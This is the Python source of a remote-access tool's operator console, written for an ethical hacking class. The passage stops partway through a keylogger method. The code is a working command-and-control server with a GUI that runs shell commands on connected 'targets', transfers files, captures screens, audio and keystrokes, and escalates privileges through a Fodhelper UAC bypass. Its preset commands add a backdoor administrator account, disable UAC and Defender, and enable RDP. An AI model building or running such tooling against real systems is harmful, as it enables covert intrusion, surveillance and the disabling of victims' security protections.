################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

# Import necessary libraries
import socket  # This library is used for creating socket connections.
import json  # JSON is used for encoding and decoding data in a structured format.
import os  # This library allows interaction with the operating system.
import base64
import tkinter as tk
from tkinter import scrolledtext, simpledialog, Listbox, Frame, Label, ttk, messagebox
import threading
import queue
import cv2
import numpy as np
import struct
import platform
from datetime import datetime

# ---vvv--- CONFIGURE STATIC IP ---vvv---
# This should be the static IP address of your cloud VM.
STATIC_IP = '192.168.1.41'
# ---^^^-----------------------------^^^---

# Linux-specific OpenCV initialization
if platform.system() == "Linux":
    # Ensure X11 display is available
    if 'DISPLAY' not in os.environ:
        os.environ['DISPLAY'] = ':0'
    
    # Try to force OpenCV to use X11
    try:
        # Set OpenCV backend to Qt or GTK if available
        cv2.setUseOptimized(True)
    except:
        pass


class MultiClientServerGUI:
    def __init__(self, master):
        self.master = master
        master.title("Attacker Control Panel")
        master.geometry("1400x800")
        master.minsize(1200, 700)

        # --- Basic UI Configuration ---
        self.colors = {
            "bg_primary": "#282C34",      # Dark background
            "bg_secondary": "#333742",    # Secondary background
            "bg_tertiary": "#404552",     # Tertiary background
            "accent_primary": "#61AFEF",  # Blue accent
            "accent_success": "#98C379",  # Green success
            "accent_warning": "#E5C07B",  # Orange warning
            "accent_danger": "#E06C75",   # Red danger
            "text_primary": "#ABB2BF",    # Primary text (light gray)
            "text_secondary": "#828997",  # Secondary text (dimmer gray)
            "text_dim": "#5C6370",        # Dimmed text
            "border": "#3E4451",          # Border color
            "button_bg": "#4A505F",       # Button background
            "button_fg": "#FFFFFF",       # Button foreground
            "button_hover": "#5C6370"     # Button hover color
        }
        
        self.fonts = {
            "title": ("Arial", 20, "bold"),
            "heading": ("Arial", 12, "bold"),
            "subheading": ("Arial", 10, "bold"),
            "body": ("Arial", 10),
            "mono": ("Consolas", 10),
            "button": ("Arial", 10, "bold"),
            "status": ("Arial", 9)
        }
        
        master.configure(bg=self.colors["bg_primary"])

        # --- Data Structures ---
        self.all_clients = {}
        self.current_target = None
        self.current_client_id = None
        self.screenshot_count = 1
        self.audio_count = 1
        self.log_queue = queue.Queue()
        self.video_queue = queue.Queue()
        self.stream_active = False
        self.stream_busy = False
        self.stream_token = None

        # --- Create Main Layout ---
        self.create_header()
        self.create_main_content()
        self.create_status_bar()

        # --- Start Server ---
        self.log_message("Start Server...", "info")
        self.master.after(100, self.process_log_queue)
        server_thread = threading.Thread(target=self.start_server, daemon=True)
        server_thread.start()

    def create_header(self):
        """Create the header section with title and stats"""
        header_frame = Frame(self.master, bg=self.colors["bg_secondary"], height=60)
        header_frame.pack(fill='x', padx=0, pady=0)
        header_frame.pack_propagate(False)

        # Title section
        title_frame = Frame(header_frame, bg=self.colors["bg_secondary"])
        title_frame.pack(side='left', padx=20, pady=10)
        
        title_label = Label(title_frame, text="ATTACKER CONTROL PANEL", 
                           font=self.fonts["title"], 
                           bg=self.colors["bg_secondary"], 
                           fg=self.colors["accent_primary"])
        title_label.pack(anchor='w')
        
        subtitle_label = Label(title_frame, text="Remote Administration Tool", 
                             font=self.fonts["body"], 
                             bg=self.colors["bg_secondary"], 
                             fg=self.colors["text_secondary"])
        subtitle_label.pack(anchor='w')

        # Stats section
        stats_frame = Frame(header_frame, bg=self.colors["bg_secondary"])
        stats_frame.pack(side='right', padx=20, pady=15)
        
        self.active_connections_label = Label(stats_frame, 
                                            text="Active: 0", 
                                            font=self.fonts["subheading"],
                                            bg=self.colors["bg_secondary"], 
                                            fg=self.colors["accent_success"])
        self.active_connections_label.pack(side='left', padx=10)
        
        self.total_connections_label = Label(stats_frame, 
                                           text="Total: 0", 
                                           font=self.fonts["subheading"],
                                           bg=self.colors["bg_secondary"], 
                                           fg=self.colors["text_secondary"])
        self.total_connections_label.pack(side='left', padx=10)

    def create_main_content(self):
        """Create the main content area"""
        main_container = Frame(self.master, bg=self.colors["bg_primary"])
        main_container.pack(fill='both', expand=True, padx=15, pady=(10, 15))

        # Create paned window for resizable sections
        paned_window = ttk.PanedWindow(main_container, orient='horizontal')
        paned_window.pack(fill='both', expand=True)

        # Left panel - Targets
        left_panel = self.create_targets_panel(main_container)
        paned_window.add(left_panel, weight=1)

        # Middle panel - Control & Log
        middle_panel = self.create_control_panel(main_container)
        paned_window.add(middle_panel, weight=3)

        # Right panel - Quick Actions
        right_panel = self.create_actions_panel(main_container)
        paned_window.add(right_panel, weight=1)

    def create_targets_panel(self, parent):
        """Create the targets list panel"""
        panel = Frame(parent, bg=self.colors["bg_secondary"], relief='flat')
        
        # Header
        header_frame = Frame(panel, bg=self.colors["bg_tertiary"], height=30)
        header_frame.pack(fill='x', padx=1, pady=(1, 0))
        header_frame.pack_propagate(False)
        
        Label(header_frame, text="TARGETS", font=self.fonts["heading"],
              bg=self.colors["bg_tertiary"], fg=self.colors["text_primary"]).pack(pady=5, padx=10)

        # Targets listbox with custom styling
        list_frame = Frame(panel, bg=self.colors["bg_secondary"])
        list_frame.pack(fill='both', expand=True, padx=1, pady=1)
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(list_frame)
        scrollbar.pack(side='right', fill='y')
        
        self.client_listbox = Listbox(list_frame, 
                                     bg=self.colors["bg_secondary"],
                                     fg=self.colors["text_primary"],
                                     selectbackground=self.colors["accent_primary"],
                                     selectforeground=self.colors["bg_primary"],
                                     font=self.fonts["body"],
                                     borderwidth=0,
                                     highlightthickness=0,
                                     activestyle='none',
                                     yscrollcommand=scrollbar.set)
        self.client_listbox.pack(fill='both', expand=True, padx=5, pady=5)
        self.client_listbox.bind("<<ListboxSelect>>", self.select_target)
        
        scrollbar.config(command=self.client_listbox.yview)

        # Target info panel
        self.target_info_frame = Frame(panel, bg=self.colors["bg_tertiary"], height=100)
        self.target_info_frame.pack(fill='x', padx=1, pady=(0, 1))
        self.target_info_frame.pack_propagate(False)
        
        self.target_info_label = Label(self.target_info_frame, 
                                      text="No target selected",
                                      font=self.fonts["status"],
                                      bg=self.colors["bg_tertiary"],
                                      fg=self.colors["text_dim"],
                                      justify='left')
        self.target_info_label.pack(padx=10, pady=5, anchor='w')

        return panel

    def create_control_panel(self, parent):
        """Create the main control and log panel"""
        panel = Frame(parent, bg=self.colors["bg_secondary"])

        # Create notebook for tabs
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Dark.TNotebook', background=self.colors["bg_secondary"])
        style.configure('Dark.TNotebook.Tab', 
                       background=self.colors["bg_tertiary"],
                       foreground=self.colors["text_secondary"],
                       padding=[15, 8])
        style.map('Dark.TNotebook.Tab',
                 background=[('selected', self.colors["bg_primary"])],
                 foreground=[('selected', self.colors["text_primary"])])

        notebook = ttk.Notebook(panel, style='Dark.TNotebook')
        notebook.pack(fill='both', expand=True, padx=1, pady=1)

        # Terminal tab
        terminal_frame = Frame(notebook, bg=self.colors["bg_primary"])
        notebook.add(terminal_frame, text='Terminal')
        self.create_terminal_tab(terminal_frame)

        # File Manager tab
        file_frame = Frame(notebook, bg=self.colors["bg_primary"])
        notebook.add(file_frame, text='Files')
        self.create_file_tab(file_frame)

        # Privilege Escalation tab
        privesc_frame = Frame(notebook, bg=self.colors["bg_primary"])
        notebook.add(privesc_frame, text='Privilege Escalation')
        self.create_privesc_tab(privesc_frame)

        # Keylogger tab
        keylog_frame = Frame(notebook, bg=self.colors["bg_primary"])
        notebook.add(keylog_frame, text='Keylogger')
        self.create_keylogger_tab(keylog_frame)

        return panel

    def create_terminal_tab(self, parent):
        """Create the terminal/console tab"""
        # Log area
        log_frame = Frame(parent, bg=self.colors["bg_primary"])
        log_frame.pack(fill='both', expand=True, padx=10, pady=10)

        self.log_area = scrolledtext.ScrolledText(log_frame, 
                                                 wrap=tk.WORD, 
                                                 state='disabled',
                                                 bg="#000000",
                                                 fg=self.colors["accent_success"],
                                                 font=self.fonts["mono"],
                                                 borderwidth=0,
                                                 highlightthickness=1,
                                                 highlightbackground=self.colors["border"],
                                                 insertbackground=self.colors["accent_primary"])
        self.log_area.pack(fill='both', expand=True)

        # Command input
        cmd_frame = Frame(parent, bg=self.colors["bg_primary"])
        cmd_frame.pack(fill='x', padx=10, pady=(0, 10))

        self.cmd_entry = tk.Entry(cmd_frame, 
                                 bg=self.colors["bg_tertiary"],
                                 fg=self.colors["text_primary"],
                                 font=self.fonts["mono"],
                                 borderwidth=0,
                                 highlightthickness=1,
                                 highlightbackground=self.colors["border"],
                                 highlightcolor=self.colors["accent_primary"],
                                 insertbackground=self.colors["accent_primary"])
        self.cmd_entry.pack(side='left', fill='x', expand=True, ipady=5)
        self.cmd_entry.bind("<Return>", self.send_command_event)

        send_btn = self.create_simple_button(cmd_frame, "Send", self.send_command_event, 
                                           bg_color=self.colors["accent_primary"])
        send_btn.pack(side='right', padx=(5, 0))

    def create_file_tab(self, parent):
        """Create the file management tab"""
        file_controls = Frame(parent, bg=self.colors["bg_primary"])
        file_controls.pack(fill='both', expand=True, padx=10, pady=10)

        # File operations section
        Label(file_controls, text="File Operations", 
              font=self.fonts["heading"],
              bg=self.colors["bg_primary"],
              fg=self.colors["text_primary"]).pack(anchor='w', pady=(0, 10))

        # Download file
        download_frame = Frame(file_controls, bg=self.colors["bg_tertiary"])
        download_frame.pack(fill='x', pady=5)
        
        Label(download_frame, text="Download from target:", 
              font=self.fonts["body"],
              bg=self.colors["bg_tertiary"],
              fg=self.colors["text_secondary"]).pack(side='left', padx=10)
        
        self.download_entry = tk.Entry(download_frame,
                                      bg=self.colors["bg_secondary"],
                                      fg=self.colors["text_primary"],
                                      font=self.fonts["body"],
                                      borderwidth=0,
                                      highlightthickness=0)
        self.download_entry.pack(side='left', fill='x', expand=True, padx=10, pady=5)
        
        download_btn = self.create_simple_button(download_frame, "Download", 
                                               lambda: self.file_operation('download'))
        download_btn.pack(side='right', padx=10, pady=5)

        # Upload file
        upload_frame = Frame(file_controls, bg=self.colors["bg_tertiary"])
        upload_frame.pack(fill='x', pady=5)
        
        Label(upload_frame, text="Upload to target:", 
              font=self.fonts["body"],
              bg=self.colors["bg_tertiary"],
              fg=self.colors["text_secondary"]).pack(side='left', padx=10)
        
        self.upload_entry = tk.Entry(upload_frame,
                                    bg=self.colors["bg_secondary"],
                                    fg=self.colors["text_primary"],
                                    font=self.fonts["body"],
                                    borderwidth=0,
                                    highlightthickness=0)
        self.upload_entry.pack(side='left', fill='x', expand=True, padx=10, pady=5)
        
        upload_btn = self.create_simple_button(upload_frame, "Upload", 
                                             lambda: self.file_operation('upload'))
        upload_btn.pack(side='right', padx=10, pady=5)

    def create_privesc_tab(self, parent):
        """Create the privilege escalation tab"""
        privesc_frame = Frame(parent, bg=self.colors["bg_primary"])
        privesc_frame.pack(fill='both', expand=True, padx=10, pady=10)

        # Header
        Label(privesc_frame, text="UAC Bypass - Fodhelper Technique", 
              font=self.fonts["heading"],
              bg=self.colors["bg_primary"],
              fg=self.colors["accent_warning"]).pack(anchor='w', pady=(0, 5))
        
        Label(privesc_frame, text="Works on Windows 10/11 with default UAC settings", 
              font=self.fonts["body"],
              bg=self.colors["bg_primary"],
              fg=self.colors["text_dim"]).pack(anchor='w', pady=(0, 15))

        # Escalate to new shell
        escalate_frame = Frame(privesc_frame, bg=self.colors["bg_tertiary"])
        escalate_frame.pack(fill='x', pady=5)
        
        escalate_info = Frame(escalate_frame, bg=self.colors["bg_tertiary"])
        escalate_info.pack(side='left', fill='x', expand=True, padx=10, pady=10)
        
        Label(escalate_info, text="Spawn Elevated Shell", 
              font=self.fonts["subheading"],
              bg=self.colors["bg_tertiary"],
              fg=self.colors["text_primary"]).pack(anchor='w')
        
        Label(escalate_info, text="Creates a new connection with admin privileges", 
              font=self.fonts["status"],
              bg=self.colors["bg_tertiary"],
              fg=self.colors["text_secondary"]).pack(anchor='w', pady=(5, 0))

        escalate_btn = self.create_simple_button(escalate_frame, "Escalate", 
                                               self.escalate_privileges,
                                               bg_color=self.colors["accent_warning"])
        escalate_btn.pack(side='right', padx=10, pady=10)

        # Run elevated command
        elevated_cmd_frame = Frame(privesc_frame, bg=self.colors["bg_tertiary"])
        elevated_cmd_frame.pack(fill='x', pady=5)
        
        elevated_info = Frame(elevated_cmd_frame, bg=self.colors["bg_tertiary"])
        elevated_info.pack(fill='x', padx=10, pady=10)
        
        Label(elevated_info, text="Run Elevated Command", 
              font=self.fonts["subheading"],
              bg=self.colors["bg_tertiary"],
              fg=self.colors["text_primary"]).pack(anchor='w')
        
        cmd_input_frame = Frame(elevated_info, bg=self.colors["bg_tertiary"])
        cmd_input_frame.pack(fill='x', pady=(5, 0))
        
        self.elevated_cmd_entry = tk.Entry(cmd_input_frame,
                                         bg=self.colors["bg_secondary"],
                                         fg=self.colors["text_primary"],
                                         font=self.fonts["mono"],
                                         borderwidth=0,
                                         highlightthickness=0)
        self.elevated_cmd_entry.pack(side='left', fill='x', expand=True, ipady=3)
        self.elevated_cmd_entry.insert(0, "net user hacker password123 /add")
        
        run_elevated_btn = self.create_simple_button(cmd_input_frame, "Execute", 
                                                    self.run_elevated_command,
                                                    bg_color=self.colors["accent_danger"])
        run_elevated_btn.pack(side='right', padx=(5, 0))

        # Common elevated commands
        Label(privesc_frame, text="Common Elevated Commands:", 
              font=self.fonts["subheading"],
              bg=self.colors["bg_primary"],
              fg=self.colors["text_secondary"]).pack(anchor='w', pady=(15, 5))

        commands_frame = Frame(privesc_frame, bg=self.colors["bg_primary"])
        commands_frame.pack(fill='x')

        common_commands = [
            ("Add Admin User", "net user hacker password123 /add && net localgroup administrators hacker /add"),
            ("Disable UAC", "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"),
            ("Disable Defender", "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true"),
            ("Enable RDP", "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f")
        ]

        for cmd_name, cmd_text in common_commands:
            cmd_btn = self.create_simple_button(commands_frame, cmd_name, 
                                                lambda c=cmd_text: self.set_elevated_command(c))
            cmd_btn.pack(side='left', padx=3, pady=3)

    def create_keylogger_tab(self, parent):
        """Create the keylogger management tab"""
        keylog_frame = Frame(parent, bg=self.colors["bg_primary"])
        keylog_frame.pack(fill='both', expand=True, padx=10, pady=10)

        # Header
        Label(keylog_frame, text="Keylogger Control Panel", 
              font=self.fonts["heading"],
              bg=self.colors["bg_primary"],
              fg=self.colors["accent_primary"]).pack(anchor='w', pady=(0, 5))
        
        Label(keylog_frame, text="Capture and monitor target's keystrokes in real-time", 
              font=self.fonts["body"],
              bg=self.colors["bg_primary"],
              fg=self.colors["text_dim"]).pack(anchor='w', pady=(0, 15))

        # Control buttons
        control_frame = Frame(keylog_frame, bg=self.colors["bg_tertiary"])
        control_frame.pack(fill='x', pady=5)
        
        control_info = Frame(control_frame, bg=self.colors["bg_tertiary"])
        control_info.pack(side='left', fill='x', expand=True, padx=10, pady=10)
        
        Label(control_info, text="Keylogger Control", 
              font=self.fonts["subheading"],
              bg=self.colors["bg_tertiary"],
              fg=self.colors["text_primary"]).pack(anchor='w')
        
        Label(control_info, text="Start, stop, and monitor keystroke capture", 
              font=self.fonts["status"],
              bg=self.colors["bg_tertiary"],
              fg=self.colors["text_secondary"]).pack(anchor='w', pady=(5, 0))

        # Control buttons frame
        buttons_frame = Frame(control_frame, bg=self.colors["bg_tertiary"])
        buttons_frame.pack(side='right', padx=10, pady=10)

        start_btn = self.create_simple_button(buttons_frame, "Start", 
                                            self.start_keylogger,
                                            bg_color=self.colors["accent_warning"])
        start_btn.pack(side='left', padx=3)

        stop_btn = self.create_simple_button(buttons_frame, "Stop", 
                                           self.stop_keylogger,
                                           bg_color=self.colors["accent_danger"])
        stop_btn.pack(side='left', padx=3)

        status_btn = self.create_simple_button(buttons_frame, "Status", 
                                             self.keylog_status)
        status_btn.pack(side='left', padx=3)

        # Log retrieval
        logs_frame = Frame(keylog_frame, bg=self.colors["bg_tertiary"])
        logs_frame.pack(fill='x', pady=5)
        
        logs_info = Frame(logs_frame, bg=self.colors["bg_tertiary"])
        logs_info.pack(side='left', fill='x', expand=True, padx=10, pady=10)
        
        Label(logs_info, text="Log Retrieval", 
              font=self.fonts["subheading"],
              bg=self.colors["bg_tertiary"],
              fg=self.colors["text_primary"]).pack(anchor='w')
        
        Label(logs_info, text="Retrieve captured keystrokes from target", 
              font=self.fonts["status"],
              bg=self.colors["bg_tertiary"],
              fg=self.colors["text_secondary"]).pack(anchor='w', pady=(5, 0))

        get_logs_btn = self.create_simple_button(logs_frame, "Get Logs", 
                                               self.get_keylog,
                                               bg_color=self.colors["accent_primary"])
        get_logs_btn.pack(side='right', padx=10, pady=10)

        # Information section
        info_frame = Frame(keylog_frame, bg=self.colors["bg_primary"])
        info_frame.pack(fill='both', expand=True, pady=(15, 0))

        Label(info_frame, text="Keylogger Information", 
              font=self.fonts["subheading"],
              bg=self.colors["bg_primary"],
              fg=self.colors["text_secondary"]).pack(anchor='w', pady=(0, 5))

        info_text = ("- Captures all keyboard input from the target machine\n"
                    "- Records special keys like [ENTER], [BACKSPACE], [CTRL], etc.\n"
                    "- Automatically manages buffer size to prevent memory issues\n"
                    "- Works silently in the background\n"
                    "- Compatible with Windows, macOS, and Linux targets\n"
                    "- Use responsibly and only on systems you own or have permission to test")

        info_label = Label(info_frame, 
                          text=info_text,
                          font=self.fonts["status"],
                          bg=self.colors["bg_primary"],
                          fg=self.colors["text_dim"],
                          justify='left',
                          wraplength=800)
        info_label.pack(anchor='w', padx=10, pady=5)

    def create_actions_panel(self, parent):
        """Create the quick actions panel"""
        panel = Frame(parent, bg=self.colors["bg_secondary"])

        # Header
        header_frame = Frame(panel, bg=self.colors["bg_tertiary"], height=30)
        header_frame.pack(fill='x', padx=1, pady=(1, 0))
        header_frame.pack_propagate(False)
        
        Label(header_frame, text="QUICK ACTIONS", font=self.fonts["heading"],
              bg=self.colors["bg_tertiary"], fg=self.colors["text_primary"]).pack(pady=5)

        # Actions container
        actions_frame = Frame(panel, bg=self.colors["bg_secondary"])
        actions_frame.pack(fill='both', expand=True, padx=10, pady=10)

        # Help Section
        Label(actions_frame, text="Help & Support",
              font=self.fonts["subheading"],
              bg=self.colors["bg_secondary"],
              fg=self.colors["text_secondary"]).pack(anchor='w', pady=(0, 5))

        help_frame = Frame(actions_frame, bg=self.colors["bg_secondary"])
        help_frame.pack(fill='x', pady=(0, 15))

        help_btn = self.create_simple_button(help_frame, "Instructions",
                                               self.show_help_window,
                                               width=12)
        help_btn.pack(fill='x', pady=2)

        # Session capture section
        Label(actions_frame, text="Session Capture", 
              font=self.fonts["subheading"],
              bg=self.colors["bg_secondary"],
              fg=self.colors["text_secondary"]).pack(anchor='w', pady=(0, 5))

        capture_frame = Frame(actions_frame, bg=self.colors["bg_secondary"])
        capture_frame.pack(fill='x', pady=(0, 15))

        screenshot_btn = self.create_simple_button(capture_frame, "Screenshot", 
                                                 self.screenshot, bg_color=self.colors["accent_primary"], 
                                                 width=12)
        screenshot_btn.pack(fill='x', pady=2)

        audio_btn = self.create_simple_button(capture_frame, "Record Audio", 
                                            self.record_audio, bg_color=self.colors["accent_primary"], 
                                            width=12)
        audio_btn.pack(fill='x', pady=2)

        self.stream_button = self.create_simple_button(capture_frame, "Live Desktop", 
                                                      self.toggle_stream, bg_color=self.colors["accent_success"], 
                                                      width=12)
        self.stream_button.pack(fill='x', pady=2)

        # System info section
        Label(actions_frame, text="System Info", 
              font=self.fonts["subheading"],
              bg=self.colors["bg_secondary"],
              fg=self.colors["text_secondary"]).pack(anchor='w', pady=(15, 5))

        info_frame = Frame(actions_frame, bg=self.colors["bg_secondary"])
        info_frame.pack(fill='x')

        sysinfo_btn = self.create_simple_button(info_frame, "System Info", 
                                              lambda: self.send_command("systeminfo", None), 
                                              width=12)
        sysinfo_btn.pack(fill='x', pady=2)

        processes_btn = self.create_simple_button(info_frame, "List Processes", 
                                                lambda: self.send_command("tasklist", None), 
                                                width=12)
        processes_btn.pack(fill='x', pady=2)

        network_btn = self.create_simple_button(info_frame, "Network Info", 
                                              lambda: self.send_command("ipconfig", "/all"), 
                                              width=12)
        network_btn.pack(fill='x', pady=2)

        # Keylogger section
        Label(actions_frame, text="Keylogger", 
              font=self.fonts["subheading"],
              bg=self.colors["bg_secondary"],
              fg=self.colors["text_secondary"]).pack(anchor='w', pady=(15, 5))

        keylog_frame = Frame(actions_frame, bg=self.colors["bg_secondary"])
        keylog_frame.pack(fill='x')

        start_keylog_btn = self.create_simple_button(keylog_frame, "Start", 
                                                   self.start_keylogger, 
                                                   bg_color=self.colors["accent_warning"], width=12)
        start_keylog_btn.pack(fill='x', pady=2)

        stop_keylog_btn = self.create_simple_button(keylog_frame, "Stop", 
                                                  self.stop_keylogger, 
                                                  bg_color=self.colors["accent_danger"], width=12)
        stop_keylog_btn.pack(fill='x', pady=2)

        get_keylog_btn = self.create_simple_button(keylog_frame, "Get Logs", 
                                                 self.get_keylog, 
                                                 bg_color=self.colors["accent_primary"], width=12)
        get_keylog_btn.pack(fill='x', pady=2)

        status_keylog_btn = self.create_simple_button(keylog_frame, "Status", 
                                                    self.keylog_status, 
                                                    width=12)
        status_keylog_btn.pack(fill='x', pady=2)

        return panel

    def create_status_bar(self):
        """Create the status bar at the bottom"""
        status_bar = Frame(self.master, bg=self.colors["bg_tertiary"], height=25)
        status_bar.pack(fill='x', side='bottom')
        status_bar.pack_propagate(False)

        # Status text
        self.status_label = Label(status_bar, 
                                text="Server running on port 5555", 
                                font=self.fonts["status"],
                                bg=self.colors["bg_tertiary"],
                                fg=self.colors["text_secondary"])
        self.status_label.pack(side='left', padx=15, pady=2)

        # Time
        self.time_label = Label(status_bar, 
                              text="",
                              font=self.fonts["status"],
                              bg=self.colors["bg_tertiary"],
                              fg=self.colors["text_dim"])
        self.time_label.pack(side='right', padx=15, pady=2)
        self.update_time()

    def create_simple_button(self, parent, text, command, bg_color=None, fg_color=None, width=None):
        """Create a simple button without complex styling."""
        if bg_color is None:
            bg_color = self.colors["button_bg"]
        if fg_color is None:
            fg_color = self.colors["button_fg"]

        button_options = {
            "text": text,
            "command": command,
            "font": self.fonts["button"],
            "bg": bg_color,
            "fg": fg_color,
            "borderwidth": 0,
            "padx": 15,
            "pady": 7,
            "cursor": "hand2"
        }
        if width is not None:
            button_options["width"] = width

        btn = tk.Button(parent, **button_options)
        
        # Simple hover effects
        def on_enter(e):
            btn.config(bg=self.colors["button_hover"])
        
        def on_leave(e):
            btn.config(bg=bg_color)
        
        btn.bind("<Enter>", on_enter)
        btn.bind("<Leave>", on_leave)
        
        return btn

    def update_time(self):
        """Update the time in status bar"""
        current_time = datetime.now().strftime("%H:%M:%S")
        self.time_label.config(text=f"Time: {current_time}")
        self.master.after(1000, self.update_time)

    def update_connection_stats(self):
        """Update connection statistics in header"""
        active = len(self.all_clients)
        self.active_connections_label.config(text=f"Active: {active}")
        
        # You could track total connections over time
        total = active  # For now, just show active
        self.total_connections_label.config(text=f"Total: {total}")

    # --- GUI and Queue Management ---
    def process_log_queue(self):
        try:
            while True:
                message = self.log_queue.get_nowait()
                if isinstance(message, tuple):
                    # Handle special commands for GUI updates
                    command, value = message
                    if command == 'add_client':
                        client_id, name = value
                        self.client_listbox.insert(tk.END, f"{name} ({client_id})")
                        self.update_connection_stats()
                    elif command == 'remove_client':
                        client_id_to_remove = value
                        # Find and remove client from listbox
                        for i, item in enumerate(self.client_listbox.get(0, tk.END)):
                            if f"({client_id_to_remove})" in item:
                                self.client_listbox.delete(i)
                                break
                        self.update_connection_stats()
                else:
                    # Check for message type
                    if isinstance(message, dict):
                        msg_type = message.get('type', 'info')
                        msg_text = message.get('text', str(message))
                    else:
                        msg_type = 'info'
                        msg_text = str(message)
                    
                    # Add timestamp
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    formatted_msg = f"[{timestamp}] {msg_text}"
                    
                    self.log_area.configure(state='normal')
                    
                    # Apply color based on message type
                    if msg_type == 'error':
                        self.log_area.insert(tk.END, formatted_msg + '\n', 'error')
                        self.log_area.tag_config('error', foreground=self.colors["accent_danger"])
                    elif msg_type == 'success':
                        self.log_area.insert(tk.END, formatted_msg + '\n', 'success')
                        self.log_area.tag_config('success', foreground=self.colors["accent_success"])
                    elif msg_type == 'warning':
                        self.log_area.insert(tk.END, formatted_msg + '\n', 'warning')
                        self.log_area.tag_config('warning', foreground=self.colors["accent_warning"])
                    else:
                        self.log_area.insert(tk.END, formatted_msg + '\n', 'info')
                        self.log_area.tag_config('info', foreground=self.colors["text_primary"]) # Ensure info text is visible
                    
                    self.log_area.configure(state='disabled')
                    self.log_area.see(tk.END)
        except queue.Empty:
            pass
        self.master.after(100, self.process_log_queue)

    def log_message(self, message, msg_type='info'):
        """Enhanced logging with message types"""
        self.log_queue.put({'text': message, 'type': msg_type})

    def select_target(self, event=None):
        selected_indices = self.client_listbox.curselection()
        if not selected_indices:
            return
        
        selected_item = self.client_listbox.get(selected_indices[0])
        # Extract client_id from "Name (ip:port)"
        client_id = selected_item[selected_item.rfind("(")+1:-1]

        self.current_client_id = client_id
        self.current_target = self.all_clients.get(client_id, {}).get('socket')
        
        if self.current_target:
            client_info = self.all_clients.get(client_id, {})
            info_text = f"Target: {client_info.get('name', 'Unknown')}\n"
            info_text += f"Address: {client_id}\n"
            info_text += f"Status: Connected"
            self.target_info_label.config(text=info_text)
            
            self.master.title(f"C2 Panel - Active: {client_info.get('name', client_id)}")
            self.log_message(f"Switched to target: {client_info.get('name', client_id)}", "success")
        else:
            self.target_info_label.config(text="Target disconnected")
            self.log_message(f"Target {client_id} no longer available.", "error")
            self.master.title("C2 Control Panel")
            if self.stream_active:
                self.stop_stream_logic()

    # --- Server and Client Management ---
    def start_server(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind(('0.0.0.0', 5555))
            sock.listen(5)
            self.log_message('Server listening on port 5555', 'success')
            self.status_label.config(text="Server active on port 5555")
            while True:
                target, ip = sock.accept()
                client_id = f"{ip[0]}:{ip[1]}"
                # Schedule the name prompt to run on the main thread
                self.master.after(0, self.prompt_for_client_name, target, client_id)
        except Exception as e:
            self.log_message(f"Server startup error: {e}", 'error')
            self.status_label.config(text="Server error", fg=self.colors["accent_danger"])

    def prompt_for_client_name(self, target, client_id):
        name = simpledialog.askstring("New Target Connected", 
                                     f"Enter a nickname for {client_id}:", 
                                     parent=self.master)
        if not name:
            name = f"Target_{len(self.all_clients) + 1}"
        
        self.all_clients[client_id] = {'socket': target, 'name': name}
        self.log_message(f'New target connected: "{name}" ({client_id})', 'success')
        self.log_queue.put(('add_client', (client_id, name)))

    def remove_client(self, client_id):
        if client_id in self.all_clients:
            client_info = self.all_clients.pop(client_id, None)
            if client_info:
                client_info['socket'].close()
            
            if self.current_client_id == client_id:
                self.current_target = None
                self.current_client_id = None
                self.master.title("C2 Control Panel")
                self.target_info_label.config(text="No target selected")
            
            self.log_queue.put(('remove_client', client_id))
            self.log_message(f"Target {client_info.get('name', client_id)} disconnected.", 'warning')

    # --- Additional GUI Methods ---
    def set_elevated_command(self, command):
        """Set command in the elevated command entry"""
        self.elevated_cmd_entry.delete(0, tk.END)
        self.elevated_cmd_entry.insert(0, command)

    def escalate_privileges(self):
        """Handle privilege escalation button click"""
        if not self.current_target:
            messagebox.showwarning("No Target", "Please select a target first.")
            return
        
        # Ask for custom host:port or use default
        result = messagebox.askyesnocancel("Privilege Escalation", 
                                          "Use current connection details for elevated shell?\n\n"
                                          "Yes: Use current connection\n"
                                          "No: Specify custom host:port\n"
                                          "Cancel: Abort operation")
        
        if result is None:  # Cancel
            return
        elif result:  # Yes - use current
            self.send_command("escalate", None)
        else:  # No - ask for custom
            custom = simpledialog.askstring("Custom Connection", 
                                          "Enter host:port for elevated shell\n"
                                          "(e.g., 192.168.1.100:6666):",
                                          parent=self.master)
            if custom:
                self.send_command("escalate", custom)

    def run_elevated_command(self):
        """Execute command with elevated privileges"""
        if not self.current_target:
            messagebox.showwarning("No Target", "Please select a target first.")
            return
        
        command = self.elevated_cmd_entry.get().strip()
        if command:
            self.send_command("run_elevated", command)
            self.log_message(f"Executing elevated command: {command}", "warning")

    def file_operation(self, operation):
        """Handle file download/upload operations"""
        if not self.current_target:
            messagebox.showwarning("No Target", "Please select a target first.")
            return
        
        if operation == 'download':
            file_path = self.download_entry.get().strip()
            if file_path:
                self.send_command("download", file_path)
                self.log_message(f"Downloading: {file_path}", "info")
        elif operation == 'upload':
            file_path = self.upload_entry.get().strip()
            if file_path:
                self.send_command("upload", file_path)
                self.log_message(f"Uploading: {file_path}", "info")

    def screenshot(self):
        self.send_command("screenshot")
        self.log_message("Taking screenshot...", "info")
    
    def record_audio(self):
        duration = simpledialog.askinteger("Audio Recording", 
                                          "Enter recording duration (seconds):",
                                          parent=self.master,
                                          minvalue=1, maxvalue=60)
        if duration:
            self.send_command("record_audio", str(duration))
            self.log_message(f"Recording audio for {duration} seconds...", "info")

    # --- Keylogger Methods ---
    def start_keylogger(self):
        """Start keylogger on target"""
        if not self.current_target:
            messagebox.showwarning("No Target", "Please select a target first.")
            return
        
        self.send_command("start_keylogger")
        self.log_message("Starting keylogger...", "warning")

    def stop_keylogger(self):
        """Stop keylogger on target"""
        if not self.current_target:
            messagebox.showwarning("No Target", "Please select a target first.")
            return
        
        self.send_command("stop_keylogger")
        self.log_message("Stopping keylogger...", "info")

    def get_keylog(self):
        """Get captured keystrokes from target"""
        if not self.current_target:
            messagebox.showwarning("No Target", "Please select a target first.")
            return
        
